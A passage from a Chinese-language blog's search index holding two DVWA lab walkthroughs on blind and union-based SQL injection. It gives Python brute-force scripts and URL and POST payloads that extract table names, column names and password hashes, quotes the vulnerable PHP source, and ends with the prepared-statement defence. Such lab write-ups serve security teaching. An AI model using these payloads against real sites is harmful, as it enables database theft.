class="string">&quot;http://192.168.249.129/dvwa/vulnerabilities/sqli_blind/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit %d,1),%d,1))=%d%%23&amp;Submit=Submit#&quot;</span> % (k, i, j)</span><br><span class="line">h = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=5sk04vktndkmb5f574o5de8m57; security=low&quot;</span>&#125;</span><br><span class="line">r = requests.get(url=u, headers=h)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;User ID exists&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">column_name += <span class="built_in">chr</span>(j)</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Testing: %s&quot;</span> % column_name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Column %d found: %s\n&quot;</span> % (k+<span class="number">1</span>, column_name))</span><br><span class="line">columns.append(column_name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nDone!&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> column <span class="keyword">in</span> columns:</span><br><span class="line"><span class="built_in">print</span>(columns)</span><br></pre></td></tr></table></figure><p>当然不太现实，程序运行一会儿可能会跑飞或者报错，因为发的请求太频繁了（即使加了 sleep(0.2) ），服务器可能会主动断开连接，报如下的错误</p><p><strong>ConnectionResetError: [WinError 10054] 远程主机强迫关闭了一个现有的连接。</strong></p><p>这个时候就需要等一会……然后调整参数接着上一次断开的地方往下爆破</p><p>如果愿意麻烦一点，写个二分算法来找，或者更改遍历策略（比如ascii从大到小），都可以在一定程度上缩小遍历空间</p><h3 id="爆破记录内容"><a href="#爆破记录内容" class="headerlink" title="爆破记录内容"></a>爆破记录内容</h3><p>最后就是爆破记录内容了，这里就放一个payload，可以看到第一个md5密码的第一位是数字5</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select Password from users limit 0,1),1,1))=53%23&amp;Submit=Submit# </span><br></pre></td></tr></table></figure><br/><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/sqli_blind/source/low.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="comment">// Check database</span></span><br><span class="line"><span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query( <span class="variable">$getid</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get results</span></span><br><span class="line"><span class="variable">$num</span> = @mysql_numrows( <span class="variable">$result</span> );</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>流程同 Low，不过改成了 POST 传参，且为数字型注入</p><p>这里给出修改后的爆表1表名的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">table1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>, <span class="number">127</span>):</span><br><span class="line">u = <span class="string">&quot;http://192.168.249.129/dvwa/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line">h = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=apovq5mpo6n7um8d9bkcqjo3q2; security=medium&quot;</span>&#125;</span><br><span class="line">d = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=%d#&quot;</span> % (i, j), <span class="string">&quot;Submit&quot;</span>:<span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">r = requests.post(url=u, headers=h, data=d)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;User ID exists&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">table1 += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="built_in">print</span>(table1)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/sqli_blind/source/medium.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="variable">$id</span> = mysql_real_escape_string( <span class="variable">$id</span> );    <span class="comment">// 16进制绕过，在SQL Injection的medium难度中有提及</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Check database</span></span><br><span class="line"><span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query( <span class="variable">$getid</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get results</span></span><br><span class="line"><span class="variable">$num</span> = @mysql_numrows( <span class="variable">$result</span> );</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><blockquote><p>分析</p></blockquote><p>点击 “Click here to change your ID. “ 后弹出输入窗口，输入 1 后 submit，显示 “Cookie ID set!”，抓包也可以看到 id 在 Cookie中</p><p><img src="../img/SQL-Injection-Blind/4.png" alt="SQL-Injection-Blind"></p><p>判断原页面使用 cookie 中的 id 来查询，修改请求的 url 与 id</p><p><img src="../img/SQL-Injection-Blind/5.png" alt="SQL-Injection-Blind"></p><p>发送请求，可以看到响应中已经显示 “MISSING”</p><p><img src="../img/SQL-Injection-Blind/6.png" alt="SQL-Injection-Blind"></p><p>当 id 为 1 时，结果又显示正确，所以之前的猜测正确</p><p><img src="../img/SQL-Injection-Blind/7.png" alt="SQL-Injection-Blind"></p><p>再尝试去掉 POST 传递的参数，依旧显示正确，故可通过将 cookie 中 id 改为 payload 来泄露数据库信息</p><p><img src="../img/SQL-Injection-Blind/8.png" alt="SQL-Injection-Blind"></p><p>之后的流程与 Low，Meduim 类似，为字符型注入</p><p>这里同样只给出爆破第一张表表名的脚本，跑起来会比较慢，是源码的问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">table1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>, <span class="number">127</span>):</span><br><span class="line">u = <span class="string">&quot;http://192.168.249.129/dvwa/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line">h = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=%d#; PHPSESSID=apovq5mpo6n7um8d9bkcqjo3q2; security=high;&quot;</span>% (i, j)&#125;</span><br><span class="line">r = requests.post(url=u, headers=h)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;User ID exists&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">table1 += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="built_in">print</span>(table1)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><br/><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/sqli_blind/source/high.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="comment">// Check database</span></span><br><span class="line"><span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query( <span class="variable">$getid</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get results</span></span><br><span class="line"><span class="variable">$num</span> = @mysql_numrows( <span class="variable">$result</span> );</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Might sleep a random amount</span></span><br><span class="line"><span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就可以解释为什么这个脚本跑起来会慢很多了，每次猜测失败都有可能会 sleep 几秒</p><br/><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>分析同上一篇文章中的 SQL Injection Impossible</p>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection</title>
      <link href="/2020/02/25/SQL-Injection/"/>
      <url>/2020/02/25/SQL-Injection/</url>
      
        <content type="html"><![CDATA[<p><strong>注：源码在 vulnerabilities/sqli 及其子目录 source 中</strong></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// low.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>payload(GET)</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 查列数</span><br><span class="line">?id=1&#x27; order by 2%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 查表名</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 查列名</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 字段内容</span><br><span class="line">?id=-1&#x27; union select group_concat(User),group_concat(Password) from users%23&amp;Submit=Submit#</span><br></pre></td></tr></table></figure><br/><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// medium.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="variable">$id</span> = mysql_real_escape_string( <span class="variable">$id</span> );   <span class="comment">// 转义SQL语句中使用的特殊字符</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>payload(POST)</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 查列数</span><br><span class="line">id=1 order by 2%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 查表名</span><br><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 查列名，转义了引号，使用users的16进制绕过0×7573657273(ascii码中u-0x75, s-0x73, e-0x65,r-0x72)</span><br><span class="line">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 字段内容</span><br><span class="line">id=-1 union select group_concat(User),group_concat(Password) from users%23&amp;Subit=Submit#</span><br></pre></td></tr></table></figure><br/><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// session-input.php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ] =  <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// high.php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>payload(POST)</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 查列数</span><br><span class="line">id=2&#x27; order by 2#&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 查表名</span><br><span class="line">id=-1&#x27; union select 1, group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 查列名</span><br><span class="line">id=-1&#x27; union select 1, group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 字段内容</span><br><span class="line">id=-1&#x27; union select group_concat(User),group_concat(Password) from users#&amp;Submit=Submit#</span><br></pre></td></tr></table></figure><br/><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// impossible.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Was a number entered?</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123;</span><br><span class="line"><span class="comment">// Check the database</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT );</span><br><span class="line"><span class="variable">$data</span>-&gt;execute();</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line"><span class="comment">// Get values</span></span><br><span class="line"><span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line"><span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>分析</p></blockquote><p>开头调用 checkToken，检查网页参数里的 token 和服务器生成的是否相等，每次 submit 都会从 session 列表中获取 token 的值并提交，在 index.php 中可以看出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$vulnerabilityFile</span> == <span class="string">&#x27;impossible.php&#x27;</span> )</span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;&quot;</span> . tokenField();</span><br><span class="line"></span><br><span class="line"><span class="comment">// dvwa/dvwaPage.inc.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tokenField</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;user_token&#x27; value=&#x27;<span class="subst">&#123;$_SESSION[ &#x27;session_token&#x27; ]&#125;</span>&#x27; /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkToken</span>(<span class="params"> <span class="variable">$user_token</span>, <span class="variable">$session_token</span>, <span class="variable">$returnURL</span> </span>) </span>&#123;  <span class="comment"># Validate the given (CSRF) token</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$user_token</span> !== <span class="variable">$session_token</span> || !<span class="keyword">isset</span>( <span class="variable">$session_token</span> ) ) &#123;</span><br><span class="line">dvwaMessagePush( <span class="string">&#x27;CSRF token is incorrect&#x27;</span> );</span><br><span class="line">dvwaRedirect( <span class="variable">$returnURL</span> );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后使用 PDO 方式连接、操作数据库，实现代码和数据分离，有效防止数据截断代码造成意外泄露</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dvwa/dvwaPage.inc.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dvwaDatabaseConnect</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=&#x27;</span> . <span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_server&#x27;</span> ].<span class="string">&#x27;;dbname=&#x27;</span> . <span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_database&#x27;</span> ].<span class="string">&#x27;;charset=utf8&#x27;</span>, <span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_user&#x27;</span> ], <span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_password&#x27;</span> ]);</span><br><span class="line">    <span class="variable">$db</span>-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">    <span class="variable">$db</span>-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, <span class="literal">false</span>);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// impossible.php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT );</span><br><span class="line"><span class="variable">$data</span>-&gt;execute();</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br></pre></td></tr></table></figure><p>结束时调用 generateSessionToken 生成下一个token</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dvwa/dvwaPage.inc.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateSessionToken</span>(<span class="params"></span>) </span>&#123;  <span class="comment"># Generate a brand new (CSRF) token</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ] ) ) &#123;</span><br><span class="line">destroySessionToken();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID</span></span><br><span class="line"><span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ] = md5( uniqid() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">destroySessionToken</span>(<span class="params"></span>) </span>&#123;  <span class="comment"># Destroy any session with the name &#x27;session_token&#x27;</span></span><br><span class="line"><span class="keyword">unset</span>( <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ] );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>token + PDO 双重保护，是一种有效防御 sql 注入的思路</p>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
